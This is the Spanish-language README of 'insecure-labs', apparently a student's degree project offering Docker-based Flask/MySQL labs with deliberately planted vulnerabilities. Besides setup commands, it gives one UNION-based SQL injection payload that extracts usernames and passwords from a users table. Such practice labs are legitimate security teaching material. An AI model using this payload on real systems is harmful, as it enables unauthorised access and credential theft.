# insecure-labs

Repositorio de laboratorios vulnerables para la realización de mi Proyecto de Fin de Grado.

## 📌 Descripción
**insecure-labs** es un conjunto de entornos diseñados para el aprendizaje y la práctica de técnicas de seguridad ofensiva. Cada laboratorio simula una aplicación con vulnerabilidades específicas, permitiendo su explotación en un entorno controlado.

## 🚀 Tecnologías Utilizadas
- **Backend:** Flask (Python)
- **Base de Datos:** MySQL
- **Contenerización:** Docker & Docker Compose

## 🛠️ Instalación y Ejecución
### Requisitos Previos
- Docker y Docker Compose instalados en el sistema.

### Pasos para desplegar el entorno
```sh
# Clonar el repositorio
git clone https://github.com/tu-usuario/insecure-labs.git
cd insecure-labs

# Construir y ejecutar los contenedores
docker-compose up --build -d
```

## 1️⃣ SQL Injection (SQLi-Lab)
- Aplicación vulnerable a inyección SQL en la búsqueda de productos.
- URL: `/buscar?nombre=producto`

Prueba un payload como en la barra de búsqueda:
```sh
' union select user(),(select group_concat(username,':', password) from users),3 -- -
```

## ⚠️ Advertencia
Este proyecto es solo para **fines educativos y de investigación**. No se debe utilizar en entornos de producción ni para actividades malintencionadas.

